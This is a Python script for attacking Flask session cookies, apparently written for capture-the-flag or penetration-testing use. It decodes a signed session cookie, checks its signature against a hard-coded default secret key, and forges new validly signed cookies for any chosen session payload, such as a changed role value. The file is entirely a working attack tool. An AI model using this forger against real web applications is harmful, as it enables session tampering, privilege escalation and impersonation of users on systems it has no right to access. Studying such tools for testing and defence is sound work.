import argparse
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
from flask.sessions import session_json_serializer
from termcolor import colored
import base64

class FlaskCookieForger:
    def __init__(self, mode: int=2, payload: str or None=None, signer_type: str="URLSafeTimedSerializer",
                 secret_key: str="UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==", salt: str="cookie-session",
                 serializer_type: str="session_json_serializer", key_derivation: str="hmac", digest_method: str="sha1"):
        self.__payload = payload
        self.__signer  = None
        if signer_type == "URLSafeTimedSerializer":
            serializer = None
            if serializer_type == "session_json_serializer":
                serializer = session_json_serializer
            self.__signer = URLSafeTimedSerializer(secret_key=secret_key, salt=salt, serializer=serializer,
                                                   signer_kwargs={'key_derivation': key_derivation,
                                                                  'digest_method': digest_method})
        if mode == 0:
            pass
        if mode == 1:
            self.verify()
        if mode == 2:
            self.read()

    def forge(self) -> str or None:
        if self.__payload is not None:
            print(colored('[+]', 'green') + ' forging session for given payload')
            return self.__signer.dumps(self.__payload)
        print(colored('[-]', 'red') + ' you must give me payload')


    def verify(self) -> bool:
        print(colored('[+]', 'green') + ' Mode = reading and verify cookie')
        if self.__payload is None:
            print(colored('[-]', 'red') + ' For reading cookie you must specify payload')
            exit(-1)
        data = self.__payload.split('.')
        if len(data) != 3:
            print(colored('[-]', 'red') + " It doesn't look like flask cookie, example of flask cookie - " +
                  colored('eyJyb2xlIjoiaW5mbyJ9.XJ3M3w.lE5vK4fi4o3oZtOO3RKrvFIYh2w', 'yellow'))
            exit(-1)
        try:
            print('cookie = ' + colored(self.__payload, 'yellow'))
            session_data, timestamp = self.__signer.loads(self.__payload, return_timestamp=True)
            print('Cookie = ' + colored(session_data, 'yellow') + '\tTimestamp = ' + colored(timestamp, 'yellow'))
            print(colored('[+]', 'green') + ' Signature is fine')
            return True
        except BadTimeSignature as e:
            print(colored('[-]', 'red') + "Incorrect signature")
            print(e.args)
            print('Check secret key and salt, also have a look on key derivation and digest methods')
        return False

    def read(self) -> str:
        print(colored('[+]', 'green') + ' Mode = reading cookie')
        if self.__payload is None:
            print(colored('[-]', 'red') + ' For reading cookie you must specify payload')
            exit(-1)
        data = self.__payload.split('.')
        if len(data) != 3:
            print(colored('[-]', 'red') + " It doesn't look like flask cookie, example of flask cookie - " +
                  colored('eyJyb2xlIjoiaW5mbyJ9.XJ3M3w.lE5vK4fi4o3oZtOO3RKrvFIYh2w', 'yellow'))
            exit(-1)
        session_payload = data[0]
        decoded_sess_payload = base64.urlsafe_b64decode(session_payload)
        print(colored('[+]', 'green') + ' Result = ' + decoded_sess_payload.decode('utf-8'))
        return session_payload

if __name__ == "__main__":
    forger = FlaskCookieForger(mode=1,payload='eyJyb2xlIjoiaW5mbyJ9.XJ3M3w.lE5vK4fi4o3oZtOO3RKrvFIYh2w')
